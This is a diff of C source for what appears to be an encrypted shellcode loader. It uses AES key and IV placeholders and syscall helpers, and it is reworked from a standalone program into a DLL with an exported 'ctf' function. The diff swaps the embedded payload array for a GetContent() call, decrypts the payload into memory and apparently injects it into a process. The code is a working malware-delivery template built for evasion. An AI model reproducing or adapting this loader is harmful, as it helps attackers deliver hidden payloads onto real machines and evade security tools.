@@ -1,5 +1,5 @@
 #include <stdio.h>
-#include <Windows.h>
+#include <windows.h>
 
 #include "whispers.h"
 #include "functions.h"
@@ -12,13 +12,12 @@ uint8_t aes_k[16] = { #-KEY_VALUE-# };
 uint8_t aes_i[16] = { #-IV_VALUE-# };
 
 
-unsigned char payload[] = {
-	#-PAYLOAD_VALUE-#
-};
+extern __declspec(dllexport) int ctf()
+{
 
-int main() {
+    PBYTE		pEncPayload			= NULL;
+	SIZE_T		sEncPayload			= 0;
 
-	SIZE_T		sEncPayload			= sizeof(payload);
 	PVOID		pClearText			= NULL,
 				pProcess			= NULL;
 	DWORD		dwSizeOfClearText	= 0,
@@ -41,9 +40,14 @@ int main() {
 		return -1;
 	
 	Sleep(500);
+	if (!GetContent(&pEncPayload, &sEncPayload)) {
+
+		//printf("[-] Failed to get the data!\n");
+		return -1;
+	}
 
 	//printf("[+] PID: %d\n", GetCurrentProcessId());
-	//printf("[+] Got the content at position: 0x%p with size of %zu\n", &payload, sEncPayload);
+	//printf("[+] Got the content at position: 0x%p with size of %zu\n", pEncPayload, sEncPayload);
 
 	// Decryption routine
 	//printf("[i] Starting the decryption...\n");
@@ -52,7 +56,7 @@ int main() {
 	// Allocating memory to store the decrypted payload inside of pClearText
 	pClearText = (PBYTE)malloc(sEncPayload);
 	AES_DecryptInit(&ctx, aes_k, aes_i);
-	AES_DecryptBuffer(&ctx, &payload, pClearText, sEncPayload);
+	AES_DecryptBuffer(&ctx, pEncPayload, pClearText, sEncPayload);
 
 	//printf("\t[+] Payload decrypted at postion: 0x%p with size of %zu\n", pClearText, sEncPayload);
 
@@ -98,4 +102,18 @@ int main() {
 	free(pClearText);
 
 	return 0;
+
+} 
+
+BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
 }
